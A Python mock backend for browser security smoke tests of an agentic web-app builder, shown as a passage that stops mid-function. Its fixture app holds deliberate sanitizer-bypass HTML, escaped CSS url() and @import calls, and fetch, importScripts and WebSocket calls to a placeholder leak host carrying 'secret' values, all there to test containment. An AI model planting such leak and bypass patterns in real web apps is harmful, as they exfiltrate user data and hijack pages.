"""Agentic Web App mock backend and browser security smoke checks."""

from __future__ import annotations

import copy
from datetime import datetime, timezone
from html import escape
from http import HTTPStatus
import json
import re
import threading
import time
from typing import Any, Callable
from urllib.parse import unquote

from host.apps.personal_web_app_builder import backend as builder_backend
from host.session_options import public_session_options


ApiErrorFactory = Callable[[HTTPStatus, str], Exception]
HostApi = Callable[[str, str, dict[str, list[str]], Any], dict[str, Any]]

AGENT_PROMPT = "Refresh the dashboard analysis from its current structured data."
LOAD_ONLY_PROMPT = "This load-only request must never start an agent task."
APP_AGENT_INPUT = f"{builder_backend.REQUEST_PREFIXES['app']}\n{AGENT_PROMPT}"
MOCK_TURN_SECONDS = 1.0
# The first turn is the only one the smoke inspects *while* it runs (the agent
# settings must be locked and the idle note shown). Those assertions are a
# handful of round trips against a UI that polls every 3s, so the window has to
# be comfortably wider than the poll rather than merely wider than a fast run.
MOCK_FIRST_TURN_SECONDS = 6.0
CONVERSATION_EVENTS_PAGE = builder_backend.CONVERSATION_EVENT_PAGE_LIMIT
INTERIM_AGENT_MESSAGE = "Drafting the app structure and checking its saved data."
LONG_MEDIA_CONDITION = " and ".join(["(min-width: 0px)"] * 40)
MOCK_LOCK = threading.RLock()
# One in-flight turn per workspace thread, completed when its deadline passes.
TURN_DEADLINES: dict[str, float] = {}
DEFAULT_SESSION = {
    "agent_runtime": "codex",
    "model": "gpt-5.6-terra",
    "effort": "high",
}
RUNTIME_LABELS = {
    "codex": "Codex",
    "claude_code": "Claude Code",
    "hermes": "Hermes",
}
DEMO_MODE = False


def configure_mock(*, demo_mode: bool) -> None:
    global DEMO_MODE
    DEMO_MODE = demo_mode


def _app_markup(count: int, title: str = "Weekly focus") -> str:
    return f"""
      <div class="sanitizer-probe containment-probe">
        <img src="https://browser-leak.invalid/image?secret=html">
        <a href="https://browser-leak.invalid/navigation?secret=anchor">Leave the app</a>
        <svg>
          <script>window.__foreignScriptRan = true</script>
          <foreignObject><img src="https://browser-leak.invalid/svg?secret=foreign"></foreignObject>
        </svg>
        <math><mtext><img src="https://browser-leak.invalid/math?secret=foreign"></mtext></math>
        <template><img src="https://browser-leak.invalid/template?secret=hidden"></template>
        <noscript><img src="https://browser-leak.invalid/noscript?secret=hidden"></noscript>
        <unknown-surface>
          <img src="https://browser-leak.invalid/unknown?secret=child">
          <span id="promoted-safe-child">Safe promoted child</span>
        </unknown-surface>
        <div id="semantic-probe">
          <abbr title="Estimated">Est.</abbr>
          <mark>Highlighted</mark>
          <ruby>信<rp>(</rp><rt>trust</rt><rp>)</rp></ruby>
          <label for="probe-priority">Priority</label>
          <input id="probe-priority" name="priority" list="priority-list" inputmode="text" pattern="[A-Za-z ]+">
          <datalist id="priority-list"><option value="Ship"></option></datalist>
        </div>
      </div>
      <form action="https://browser-leak.invalid/form?secret=form">
        <main class="dashboard">
          <p class="eyebrow">Personal dashboard</p>
          <h1>{escape(title)}</h1>
          <div class="metric"><strong data-count>{count}</strong><span>open priorities</span></div>
          <label><input type="checkbox" data-action="toggle-review"> Reviewed</label>
          <div class="dashboard-actions">
            <button data-action="increment">Add priority</button>
            <button data-action="refresh-analysis">Refresh analysis</button>
          </div>
          <div class="drag-probe">
            <button id="drag-source" data-drag-value="priority-ship">Drag Ship builder</button>
            <div id="drop-target" data-drop-action="move-priority" data-drop-value="priority-review">Drop before Review security</div>
            <button id="bad-drop-target" data-drop-action="bad action">Invalid drop target</button>
          </div>
        </main>
      </form>
    """


def _empty_app() -> dict[str, Any]:
    return {
        "ui_revision": 0,
        "data_version": 0,
        "html": "",
        "css": "",
        "javascript": "",
        "data": {},
        "updated_at": "1970-01-01T00:00:00Z",
    }


def _built_app(title: str = "Weekly focus") -> dict[str, Any]:
    html = _app_markup(2, title)
    css = """
      @import url(https://browser-leak.invalid/style?secret=css);
      :h\\6fst { position:fixed!important; inset:0!important; z-index:2147483647!important; }
      .dashboard { display:grid; gap:1rem; max-width:48rem; margin:0 auto; padding:3rem 1.25rem; }
      .dashboard h1 { font-size:2rem; margin:0 0 .5rem; }
      .sanitizer-probe { display:none; }
      .containment-probe { position:fixed; inset:0; z-index:2147483647; }
      .containment-probe { background-image:url(https://browser-leak.invalid/background?secret=css); }
      .containment-probe { --escaped-image:u\\72l(https://browser-leak.invalid/escaped?secret=css); background-image:var(--escaped-image); }
      .eyebrow { color:#8b8b92; text-transform:uppercase; letter-spacing:.08em; }
      .metric { --panel-start:#11151d; background:linear-gradient(135deg,#11151d,#172033); color:var(--metric-text,#f4f7fb); display:flex; align-items:baseline; gap:.55rem; padding:1.25rem; border:1px solid #2e3644; border-radius:14px; }
      .metric strong { font-size:2.5rem; }
      #semantic-probe { filter:saturate(1); clip-path:inset(0 round 1px); text-shadow:0 1px 1px #000; }
      #semantic-probe::before { content:"Safe"; }
      .dashboard-actions { display:flex; flex-wrap:wrap; gap:.65rem; }
      .drag-probe { display:flex; flex-wrap:wrap; gap:.65rem; }
      [data-dragging] { opacity:.5; }
      [data-drag-over] { outline:2px solid #7c3aed; }
      button { background-color:#202838; border:1px solid #3d485c; color:#f4f7fb; cursor:pointer; width:max-content; padding:.65rem .9rem; border-radius:10px; }
      @supports (display: grid) { .supports-surface { color: red; } }
      @media __LONG_MEDIA_CONDITION__ { .too-long-media { color: red; } }
      @media (max-width: 640px) { .dashboard { padding: 2rem 1rem; } }
    """.replace("__LONG_MEDIA_CONDITION__", LONG_MEDIA_CONDITION)
    oversize_probe = "" if DEMO_MODE else f"""
        try {{
          app.render('x'.repeat({builder_backend.MAX_HTML_BYTES + 1}));
        }} catch (_error) {{
          app.notify('Oversized render rejected', 'success');
        }}
    """
    return {
        "ui_revision": 1,
        "data_version": 1,
        "html": html,
        "css": css,
        "javascript": f"""
      try {{ fetch('https://browser-leak.invalid/fetch?secret=worker'); }} catch (_error) {{}}
      try {{ importScripts('https://browser-leak.invalid/import?secret=worker'); }} catch (_error) {{}}
      try {{ new WebSocket('wss://browser-leak.invalid/socket?secret=worker'); }} catch (_error) {{}}
      try {{ setTimeout(() => {{}}, 5); }} catch (_error) {{}}
      const initialMarkup = {json.dumps(html)};
      const initialCss = {json.dumps(css)};
      const renderDashboard = data => app.render(
        initialMarkup.replace('>2</strong>', `>${{data.count}}</strong>`),
        initialCss,
      );
      app.onLoad(() => {{
        {oversize_probe}
        app.askAgent('{LOAD_ONLY_PROMPT}');
        renderDashboard(app.data());
      }});
      app.on('increment', async () => {{
        const next = await app.set(['count'], app.data().count + 1);
        renderDashboard(next);
      }});
      app.on('toggle-review', event => app.notify(event.checked ? 'Review marked complete' : 'Review reopened', 'success'));
      app.on('move-priority', event => app.notify(
        `Moved ${{event.draggedValue}} before ${{event.value}}`,
        'success',
      ));
      app.on('refresh-analysis', () => app.askAgent('{AGENT_PROMPT}'));
    """,
        "data": {"count": 2, "priorities": ["Ship builder", "Review security"]},
        "updated_at": "2026-07-22T10:00:00Z",
    }


WORKSPACES: dict[str, dict[str, Any]] = {}


def reset_mock_state() -> None:
    with MOCK_LOCK:
        WORKSPACES.clear()
        TURN_DEADLINES.clear()


reset_mock_state()


def route_app_api(
    method: str,
    relative: str,
    query: dict[str, list[str]],
    body: Any,
    api_error: ApiErrorFactory,
    _host_api: HostApi,
) -> dict[str, Any]:
    try:
        return _route_app_api(method, relative, body, query)
    except builder_backend.AppError as exc:
        raise api_error(exc.status, exc.message) from exc


def _route_app_api(
    method: str,
    relative: str,
    body: Any,
    query: dict[str, list[str]] | None = None,
) -> dict[str, Any]:
    if method == "GET" and relative == "session-options":
        return {"session_options": public_session_options()}
    with MOCK_LOCK:
        _progress_turns()
        if method == "GET" and relative == "apps":
            return _list_apps(query or {})
        if method == "POST" and relative == "apps":
            return {"app": _create_app()}
        app_match = re.fullmatch(r"apps/([^/]+)/(.*)", relative)
        if not app_match:
            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
        thread_id = _path_segment(app_match.group(1))
        workspace = WORKSPACES.get(thread_id)
        if workspace is None:
            raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "app not found")
        resource = app_match.group(2)
        if method == "GET" and resource == "state":
            return {"app": copy.deepcopy(workspace["app"])}
        if method == "GET" and resource == "conversation":
            return {
                "session": copy.deepcopy(workspace["session"]),
                "status": _workspace_status(workspace),
            }
        if method == "GET" and resource == "conversation/events":
            return _conversation_events(workspace, query or {})
        if method == "GET" and resource == "instructions":
            return copy.deepcopy(workspace["instructions"])
        if method == "GET" and resource == "memories":
            return _list_memories(workspace, query or {})
        memory_match = re.fullmatch(r"memories/([^/]+)", resource)
        if method == "GET" and memory_match:
            return {"memory": _load_memory(workspace, builder_backend._memory_name(memory_match.group(1)))}
        if method == "GET" and resource == "schedules":
            return {"schedules": copy.deepcopy(workspace["schedules"])}
        if method == "GET" and resource == "checkpoints":
            return _list_checkpoints(workspace)
        if method == "PUT" and resource == "name":
            return {"app": _rename_app(workspace, body)}
        if method == "POST" and resource == "stop":
            return _stop_turn(workspace)
        if method == "POST" and resource == "runtime/actions":
            return _runtime_action(workspace, body)
        if method == "POST" and resource == "messages":
            return _create_message(workspace, body, requested_by="user")
        if method == "POST" and resource == "runtime/agent-requests":
            return _create_message(workspace, body, requested_by="app")
        if method == "PUT" and resource == "instructions":
            return _save_instructions(workspace, body)
        if memory_match and method == "PUT":
            return {"memory": _save_memory(workspace, builder_backend._memory_name(memory_match.group(1)), body)}
        if memory_match and method == "DELETE":
            name = builder_backend._memory_name(memory_match.group(1))
            removed = workspace["memories"].pop(name, None)
            if removed is None:
                raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "memory not found")
            _record_history(
                workspace, "memory", "user",
                {"name": name, "old": _memory_content(removed), "new": None},
            )
            return {"ok": True}
        if method == "POST" and resource == "schedules":
            return {"schedule": _create_schedule(workspace, body)}
        if method == "POST" and resource == "checkpoints":
            return {"checkpoint": _save_checkpoint(workspace, "manual")}
        schedule_match = re.fullmatch(r"schedules/([1-9][0-9]{0,17})", resource)
        if schedule_match and method == "PUT":
            return {"schedule": _update_schedule(workspace, int(schedule_match.group(1)), body)}
        if schedule_match and method == "DELETE":
            return _delete_schedule(workspace, int(schedule_match.group(1)))
        checkpoint_match = re.fullmatch(
            r"checkpoints/([1-9][0-9]{0,17})/revert", resource
        )
        if method == "POST" and checkpoint_match:
            return _revert_checkpoint(workspace, int(checkpoint_match.group(1)))
    raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "route not found")


def _list_apps(query: dict[str, list[str]]) -> dict[str, Any]:
    if query:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected app query fields: {', '.join(sorted(query))}",
        )
    apps = [_app_summary(workspace) for workspace in WORKSPACES.values()]
    apps.sort(key=lambda app: str(app["last_used_at"]), reverse=True)
    return {"apps": apps}


def _workspace_status(workspace: dict[str, Any]) -> str:
    return "running" if workspace["turn"] is not None else "idle"


def _app_summary(workspace: dict[str, Any]) -> dict[str, Any]:
    return {
        "thread_id": workspace["thread_id"],
        "name": workspace["name"],
        "ui_revision": workspace["app"]["ui_revision"],
        "created_at": workspace["created_at"],
        "updated_at": workspace["app"]["updated_at"],
        "last_used_at": max(workspace["app"]["updated_at"], workspace["last_used_at"]),
        "session": copy.deepcopy(workspace["session"]),
        "status": _workspace_status(workspace),
    }


def _create_app() -> dict[str, Any]:
    numbers = [
        int(match.group(1))
        for thread_id in WORKSPACES
        if (match := builder_backend.THREAD_NAME_RE.fullmatch(thread_id))
        is not None
    ]
    thread_id = f"app-{max(numbers, default=0) + 1}"
    now = _now()
    app = _empty_app()
    app["updated_at"] = now
    workspace = {
        "thread_id": thread_id,
        "name": thread_id,
        "created_at": now,
        "last_used_at": now,
        "app": app,
        "turn": None,
        "events": [],
        "session": None,
        "instructions": {"instructions_md": "", "updated_by": "", "updated_at": ""},
        "memories": {},
        "schedules": [],
        "schedule_seq": 0,
        "history": [],
        "history_seq": 0,
    }
    WORKSPACES[thread_id] = workspace
    _record_history(workspace, "ui", "user", {"html": "", "css": "", "javascript": ""})
    _record_history(workspace, "snapshot", "user", {"data": {}})
    _save_checkpoint(workspace, "automatic")
    return _app_summary(workspace)


def _rename_app(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "rename request")
    builder_backend._require_keys(request, {"name"}, required={"name"})
    name = builder_backend._required_text(request.get("name"), "name")
    if len(name) > builder_backend.MAX_APP_NAME_CHARS:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"name must be at most {builder_backend.MAX_APP_NAME_CHARS} characters",
        )
    workspace["name"] = name
    return _app_summary(workspace)


def _conversation_events(
    workspace: dict[str, Any], query: dict[str, list[str]]
) -> dict[str, Any]:
    unexpected = sorted(set(query) - {"since", "before", "activity"})
    if unexpected:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            f"unexpected conversation event query fields: {', '.join(unexpected)}",
        )
    since_values = query.get("since") or []
    before_values = query.get("before") or []
    activity_values = query.get("activity") or []
    if since_values and before_values:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST, "since and before cannot be combined"
        )
    for name, values in (("since", since_values), ("before", before_values)):
        if len(values) > 1:
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be provided once",
            )
        if values and not values[0].isdigit():
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                f"{name} must be a non-negative integer",
            )
    if len(activity_values) > 1 or (
        activity_values and activity_values[0] not in {"true", "false"}
    ):
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST, "activity must be true or false"
        )
    include_activity = not activity_values or activity_values[0] == "true"
    eligible_events = [
        event
        for event in workspace["events"]
        if include_activity or event["event_type"] != "thread.activity"
    ]
    if since_values:
        since = int(since_values[0])
        page = [
            event for event in eligible_events if event["seq"] > since
        ][:CONVERSATION_EVENTS_PAGE]
    else:
        before = int(before_values[0]) if before_values else None
        eligible = [
            event
            for event in eligible_events
            if before is None or event["seq"] < before
        ]
        page = eligible[-CONVERSATION_EVENTS_PAGE:]
    events = copy.deepcopy(page)
    for event in events:
        payload = event.get("payload")
        if isinstance(payload, dict) and isinstance(payload.get("message"), str):
            payload["message"] = _clip_message(payload["message"])
    return {"events": events}


def _clip_message(value: str) -> str:
    maximum = builder_backend.CONVERSATION_MESSAGE_BYTES
    encoded = value.encode()
    if len(encoded) <= maximum:
        return value
    suffix = "…".encode()
    return encoded[: maximum - len(suffix)].decode(errors="ignore") + "…"


# --- History -----------------------------------------------------------------


def _record_history(
    workspace: dict[str, Any], kind: str, actor: str, entry: dict[str, Any]
) -> None:
    workspace["history_seq"] += 1
    workspace["history"].append(
        {
            "id": workspace["history_seq"],
            "kind": kind,
            "actor": actor,
            "ui_revision": workspace["app"]["ui_revision"],
            "data_version": workspace["app"]["data_version"],
            "entry": copy.deepcopy(entry),
            "created_at": _now(),
        }
    )


def _list_history(
    workspace: dict[str, Any], query: dict[str, list[str]]
) -> dict[str, Any]:
    before_values = query.get("before") or []
    before = int(before_values[0]) if before_values else None
    rows = [
        entry
        for entry in reversed(workspace["history"])
        if before is None or entry["id"] < before
    ]
    page = rows[: builder_backend.HISTORY_PAGE_LIMIT]
    entries = [
        builder_backend._history_summary(
            (
                entry["id"], entry["kind"], entry["actor"], entry["ui_revision"],
                entry["data_version"],
                json.dumps(entry["entry"]), entry["created_at"],
            )
        )
        for entry in page
    ]
    more = len(rows) > len(page)
    return {"entries": entries, "next_before": page[-1]["id"] if more and page else None}


def _checkpoint_payload(workspace: dict[str, Any], checkpoint_type: str) -> dict[str, Any]:
    app = workspace["app"]
    return {
        "checkpoint_type": checkpoint_type,
        "checkpoint_date": datetime.now(timezone.utc).date().isoformat(),
        "name": workspace["name"],
        "html": app["html"],
        "css": app["css"],
        "javascript": app["javascript"],
        "data": copy.deepcopy(app["data"]),
        "instructions_md": workspace["instructions"]["instructions_md"],
        "memories": [
            {key: memory[key] for key in ("name", "description", "body_md")}
            for memory in sorted(workspace["memories"].values(), key=lambda item: item["name"])
        ],
        "schedules": [
            {"id": schedule["id"], **_schedule_definition(schedule)}
            for schedule in workspace["schedules"]
        ],
    }


def _save_checkpoint(
    workspace: dict[str, Any], checkpoint_type: str
) -> dict[str, Any]:
    payload = _checkpoint_payload(workspace, checkpoint_type)
    existing = next(
        (
            entry for entry in reversed(workspace["history"])
            if entry["kind"] == "checkpoint"
            and entry["entry"].get("checkpoint_type") == checkpoint_type
            and entry["entry"].get("checkpoint_date") == payload["checkpoint_date"]
        ),
        None,
    )
    if existing is None:
        _record_history(
            workspace, "checkpoint", "app" if checkpoint_type == "automatic" else "user",
            payload,
        )
        existing = workspace["history"][-1]
    elif checkpoint_type == "manual":
        existing["entry"] = payload
        existing["ui_revision"] = workspace["app"]["ui_revision"]
        existing["data_version"] = workspace["app"]["data_version"]
        existing["created_at"] = _now()
    return builder_backend._history_summary(
        (
            existing["id"], existing["kind"], existing["actor"],
            existing["ui_revision"], existing["data_version"],
            json.dumps(existing["entry"]), existing["created_at"],
        )
    )


def _list_checkpoints(workspace: dict[str, Any]) -> dict[str, Any]:
    checkpoints = []
    for entry in reversed(workspace["history"]):
        if entry["kind"] != "checkpoint":
            continue
        checkpoints.append(builder_backend._history_summary(
            (
                entry["id"], entry["kind"], entry["actor"], entry["ui_revision"],
                entry["data_version"], json.dumps(entry["entry"]), entry["created_at"],
            )
        ))
    return {"checkpoints": checkpoints}


def _revert_checkpoint(workspace: dict[str, Any], checkpoint_id: int) -> dict[str, Any]:
    entry = next(
        (
            candidate for candidate in workspace["history"]
            if candidate["id"] == checkpoint_id and candidate["kind"] == "checkpoint"
        ),
        None,
    )
    if entry is None:
        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "checkpoint not found")
    saved = copy.deepcopy(entry["entry"])
    app = workspace["app"]
    workspace["name"] = saved["name"]
    app.update({
        "html": saved["html"],
        "css": saved["css"],
        "javascript": saved["javascript"],
        "data": saved["data"],
        "ui_revision": app["ui_revision"] + 1,
        "data_version": app["data_version"] + 1,
        "updated_at": _now(),
    })
    workspace["instructions"] = {
        "instructions_md": saved["instructions_md"],
        "updated_by": "user",
        "updated_at": _now(),
    }
    workspace["memories"] = {
        memory["name"]: {
            **memory, "updated_by": "user", "updated_at": _now(),
        }
        for memory in saved["memories"]
    }
    now = _now()
    workspace["schedules"] = [{
        **schedule,
        "created_by": "user",
        "last_run_at": None,
        "next_run_at": builder_backend._format_ts(
            builder_backend._next_cadence_run(
                schedule["cadence"], schedule["interval_minutes"],
                schedule["daily_time"], datetime.now(timezone.utc),
            )
        ),
        "created_at": now,
        "updated_at": now,
    } for schedule in saved["schedules"]]
    workspace["schedule_seq"] = max(
        [schedule["id"] for schedule in workspace["schedules"]], default=0
    )
    _record_history(
        workspace, "ui", "user",
        {
            "html": app["html"], "css": app["css"], "javascript": app["javascript"],
            "restored_from": checkpoint_id,
        },
    )
    _record_history(
        workspace, "snapshot", "user",
        {**saved, "restored_from": checkpoint_id},
    )
    return {"ok": True, "app": copy.deepcopy(app)}


# --- Instructions, memories, schedules ---------------------------------------


def _save_instructions(workspace: dict[str, Any], body: Any) -> dict[str, Any]:
    request = builder_backend._required_object(body, "instructions request")
    builder_backend._require_keys(request, {"instructions_md"}, required={"instructions_md"})
    instructions = builder_backend._bounded_string(
        request.get("instructions_md"), "instructions_md",
        builder_backend.MAX_INSTRUCTIONS_BYTES,
    )
    old = workspace["instructions"]["instructions_md"]
    workspace["instructions"] = {
        "instructions_md": instructions,
        "updated_by": "user",
        "updated_at": _now(),
    }
    if old != instructions:
        _record_history(
            workspace, "instructions", "user", {"old": old, "new": instructions}
        )
    return copy.deepcopy(workspace["instructions"])


def _memory_content(memory: dict[str, Any]) -> dict[str, str]:
    return {"description": memory["description"], "body_md": memory["body_md"]}


def _schedule_definition(schedule: dict[str, Any]) -> dict[str, Any]:
    return {
        key: schedule[key]
        for key in ("name", "message", "cadence", "interval_minutes", "daily_time", "enabled")
    }


def _list_memories(
    workspace: dict[str, Any], query: dict[str, list[str]]
) -> dict[str, Any]:
    needle = (query.get("q") or [""])[0].lower()
    memories = [
        {key: memory[key] for key in ("name", "description", "updated_by", "updated_at")}
        for memory in workspace["memories"].values()
        if not needle or needle in memory["name"].lower()
        or needle in memory["description"].lower()
        or needle in memory["body_md"].lower()
    ]
    memories.sort(key=lambda memory: (memory["updated_at"], memory["name"]), reverse=True)
    return {"memories": memories}


def _load_memory(workspace: dict[str, Any], name: str) -> dict[str, Any]:
    memory = workspace["memories"].get(name)
    if memory is None:
        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "memory not found")
    return copy.deepcopy(memory)


def _save_memory(workspace: dict[str, Any], name: str, body: Any) -> dict[str, Any]:
    request = builder_backend._required_object(body, "memory request")
    builder_backend._require_keys(
        request, {"description", "body_md"}, required={"description", "body_md"}
    )
    description = builder_backend._required_text(request.get("description"), "description")
    body_md = builder_backend._bounded_string(
        request.get("body_md"), "body_md", builder_backend.MAX_MEMORY_BODY_BYTES
    )
    old = workspace["memories"].get(name)
    workspace["memories"][name] = {
        "name": name,
        "description": description,
        "body_md": body_md,
        "updated_by": "user",
        "updated_at": _now(),
    }
    new_content = {"description": description, "body_md": body_md}
    if old is None or _memory_content(old) != new_content:
        _record_history(
            workspace, "memory", "user",
            {
                "name": name,
                "old": None if old is None else _memory_content(old),
                "new": new_content,
            },
        )
    return copy.deepcopy(workspace["memories"][name])


def _create_schedule(workspace: dict[str, Any], body: Any) -> dict[str, Any]:
    request = builder_backend._required_object(body, "schedule request")
    builder_backend._require_keys(
        request,
        {"name", "message", "cadence", "interval_minutes", "daily_time", "enabled"},
        required={"name", "message", "cadence"},
    )
    fields = builder_backend._validated_schedule_fields(request)
    workspace["schedule_seq"] += 1
    now = _now()
    schedule = {
        "id": workspace["schedule_seq"],
        **fields,
        "created_by": "user",
        "last_run_at": None,
        "next_run_at": builder_backend._format_ts(
            builder_backend._next_cadence_run(
                fields["cadence"], fields["interval_minutes"], fields["daily_time"],
                datetime.now(timezone.utc),
            )
        ),
        "created_at": now,
        "updated_at": now,
    }
    workspace["schedules"].append(schedule)
    _record_history(
        workspace, "schedule", "user",
        {"schedule_id": schedule["id"], "old": None, "new": _schedule_definition(schedule)},
    )
    return copy.deepcopy(schedule)


def _update_schedule(
    workspace: dict[str, Any], schedule_id: int, body: Any
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "schedule request")
    schedule = next(
        (candidate for candidate in workspace["schedules"] if candidate["id"] == schedule_id),
        None,
    )
    if schedule is None:
        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "schedule not found")
    merged = {
        key: request.get(key, schedule[key])
        for key in ("name", "message", "cadence", "interval_minutes", "daily_time", "enabled")
    }
    old = _schedule_definition(schedule)
    schedule.update(builder_backend._validated_schedule_fields(merged))
    schedule["updated_at"] = _now()
    new = _schedule_definition(schedule)
    if old != new:
        _record_history(
            workspace, "schedule", "user",
            {"schedule_id": schedule["id"], "old": old, "new": new},
        )
    return copy.deepcopy(schedule)


def _delete_schedule(workspace: dict[str, Any], schedule_id: int) -> dict[str, Any]:
    removed = next(
        (schedule for schedule in workspace["schedules"] if schedule["id"] == schedule_id),
        None,
    )
    if removed is None:
        raise builder_backend.AppError(HTTPStatus.NOT_FOUND, "schedule not found")
    workspace["schedules"] = [
        schedule for schedule in workspace["schedules"] if schedule["id"] != schedule_id
    ]
    _record_history(
        workspace, "schedule", "user",
        {"schedule_id": schedule_id, "old": _schedule_definition(removed), "new": None},
    )
    return {"ok": True}


# --- Data actions and messages -----------------------------------------------


def _runtime_action(
    workspace: dict[str, Any], body: Any
) -> dict[str, Any]:
    action = builder_backend._required_object(body, "runtime action")
    name = builder_backend._required_text(action.get("action"), "action")
    allowed = {"action", "expected_data_version", "path"}
    required = {"action", "expected_data_version", "path"}
    if name in {"set", "append"}:
        allowed.add("value")
        required.add("value")
    builder_backend._require_keys(action, allowed, required=required)
    if name not in {"set", "delete", "append"}:
        raise builder_backend.AppError(HTTPStatus.UNPROCESSABLE_ENTITY, "unsupported data action")
    version = builder_backend._required_counter(
        action.get("expected_data_version"), "expected_data_version"
    )
    app = workspace["app"]
    if version != app["data_version"]:
        raise builder_backend.AppError(HTTPStatus.CONFLICT, "app data changed; reload and retry")
    path = builder_backend._validated_path(action.get("path"))
    updated = builder_backend._mutate_data(
        copy.deepcopy(app["data"]), name, path, action.get("value")
    )
    builder_backend._validated_data(updated)
    app["data"] = updated
    app["data_version"] = version + 1
    app["updated_at"] = _now()
    entry: dict[str, Any] = {"action": name, "path": path}
    if name != "delete":
        entry["value"] = action.get("value")
    _record_history(workspace, "data", "app", entry)
    return {
        "app": {
            "ui_revision": app["ui_revision"],
            "data_version": app["data_version"],
            "data": copy.deepcopy(updated),
            "updated_at": app["updated_at"],
        }
    }


def _workspace_context(workspace: dict[str, Any]) -> str:
    instructions = workspace["instructions"]["instructions_md"]
    memories = list(workspace["memories"].values())
    lines = [builder_backend.CONTEXT_OPEN]
    if not instructions and not memories:
        lines.append("(No saved instructions or memories.)")
    elif instructions:
        lines.append("Always-on instructions:")
        lines.append(instructions)
    if memories:
        lines.append("Memory index (read a body: app_api GET /agent/memories/{name}):")
        lines.extend(f"- {memory['name']}: {memory['description']}" for memory in memories)
    lines.append(builder_backend.CONTEXT_CLOSE)
    return "\n".join(lines) + "\n"


def _create_message(
    workspace: dict[str, Any],
    body: Any,
    *,
    requested_by: str,
) -> dict[str, Any]:
    request = builder_backend._required_object(body, "message request")
    config_fields = ("agent_runtime", "model", "effort")
    builder_backend._require_keys(
        request,
        {"content", *config_fields},
        required={"content"},
    )
    prefix = builder_backend.REQUEST_PREFIXES[requested_by]
    context = _workspace_context(workspace)
    content = builder_backend._bounded_required_text(
        request.get("content"),
        "content",
        builder_backend.MAX_CHAT_MESSAGE_BYTES - len(f"{prefix}\n{context}".encode()),
    )
    input_message = f"{prefix}\n{context}{content}"
    supplied = [field for field in config_fields if field in request]
    if supplied and len(supplied) != len(config_fields):
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            "agent_runtime, model, and effort must be provided together",
        )
    requested: dict[str, str] | None = None
    if supplied:
        runtime = builder_backend._required_text(request.get("agent_runtime"), "agent_runtime")
        model = request.get("model")
        effort = request.get("effort")
        error = builder_backend.session_config_error(runtime, model, effort)
        if error is not None:
            raise builder_backend.AppError(HTTPStatus.BAD_REQUEST, error)
        assert isinstance(model, str) and isinstance(effort, str)
        requested = {"agent_runtime": runtime, "model": model, "effort": effort}
    session = workspace["session"]
    if session is not None:
        if requested is not None and requested != session:
            if workspace["turn"] is not None:
                raise builder_backend.AppError(
                    HTTPStatus.CONFLICT,
                    "thread runtime, model, and effort can change only while the thread is idle",
                )
            previous = session
            workspace["session"] = requested
            _append_turn_event(
                workspace,
                "thread.activity",
                {
                    "activity": {
                        "provider": "kern",
                        "activity_id": "session-change",
                        "kind": "status",
                        "status": "completed",
                        "title": (
                            "Agent provider changed"
                            if previous["agent_runtime"] != requested["agent_runtime"]
                            else "Agent session changed"
                        ),
                        "detail": (
                            f"{RUNTIME_LABELS[previous['agent_runtime']]} · "
                            f"{previous['model']} · {previous['effort']} → "
                            f"{RUNTIME_LABELS[requested['agent_runtime']]} · "
                            f"{requested['model']} · {requested['effort']}"
                        ),
                        "output": None,
                    }
                },
            )
    else:
        if requested is None:
            raise builder_backend.AppError(
                HTTPStatus.BAD_REQUEST,
                "agent_runtime, model, and effort are required for the first message",
            )
        workspace["session"] = requested
    workspace["last_used_at"] = _now()
    turn = workspace["turn"]
    if turn is not None:
        # No queue: a message on a busy thread steers its running turn.
        turn["input_message"] = input_message
        _append_turn_event(
            workspace, "thread.message", {"message": input_message, "source": "user"}
        )
        return {"status": "accepted", "thread_id": workspace["thread_id"]}
    workspace["turn"] = {"input_message": input_message}
    has_bundle = any(
        workspace["app"].get(field)
        for field in ("html", "css", "javascript")
    )
    turn_seconds = MOCK_TURN_SECONDS if has_bundle else MOCK_FIRST_TURN_SECONDS
    TURN_DEADLINES[workspace["thread_id"]] = time.monotonic() + turn_seconds
    _append_turn_event(
        workspace, "thread.message", {"message": input_message, "source": "user"}
    )
    activity_id = f"mock-turn-{len(workspace['events'])}"
    for activity in (
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "started",
            "status": "running",
            "title": "Inspecting app workspace",
            "detail": "Read the current app files and structured data.",
            "output": "Reading files.",
        },
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "started",
            "status": "running",
            "title": "Command output",
            "output": " Structured data loaded.",
            "append_output": True,
        },
        {
            "provider": "kern",
            "activity_id": activity_id,
            "kind": "command",
            "phase": "completed",
            "status": "exit 0",
            "title": "Command output",
        },
    ):
        _append_turn_event(workspace, "thread.activity", {"activity": activity})
    _append_turn_event(
        workspace, "thread.message", {"message": INTERIM_AGENT_MESSAGE, "source": "agent"}
    )
    return {"status": "accepted", "thread_id": workspace["thread_id"]}


def _stop_turn(workspace: dict[str, Any]) -> dict[str, Any]:
    if workspace["turn"] is None:
        raise builder_backend.AppError(
            HTTPStatus.CONFLICT, "the thread has no running work"
        )
    TURN_DEADLINES.pop(workspace["thread_id"], None)
    workspace["turn"] = None
    workspace["last_used_at"] = _now()
    _append_turn_event(workspace, "thread.stopped", {})
    return {"status": "accepted"}


def _progress_turns() -> None:
    now_monotonic = time.monotonic()
    for workspace in WORKSPACES.values():
        turn = workspace["turn"]
        deadline = TURN_DEADLINES.get(workspace["thread_id"])
        if turn is None or deadline is None or now_monotonic < deadline:
            continue
        app = workspace["app"]
        now = _now()
        has_bundle = bool(app["html"] or app["css"] or app["javascript"])
